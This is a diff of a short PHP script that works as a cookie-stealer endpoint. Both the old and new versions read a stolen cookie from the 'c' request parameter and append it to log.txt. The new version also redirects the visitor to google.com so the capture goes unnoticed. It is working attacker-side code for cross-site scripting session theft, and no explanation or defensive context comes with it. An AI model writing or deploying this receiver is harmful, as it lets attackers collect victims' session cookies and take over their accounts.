@@ -1,7 +1,11 @@
-<?php
-$cookie = $_GET['c'];
-$fp = fopen('log.txt', 'a+');
-fwrite($fp, 'Cookie:' .$cookie.'\r\n');
-fclose($fp);
+<?php 
+$logFile = "log.txt"; 
+$cookie = $_REQUEST["c"];
 
+$handle = fopen($logFile, "a"); 
+fwrite($handle, $cookie . "\n\n"); 
+fclose($handle);
+
+header("Location: http://www.google.com/"); 
+exit; 
 ?>
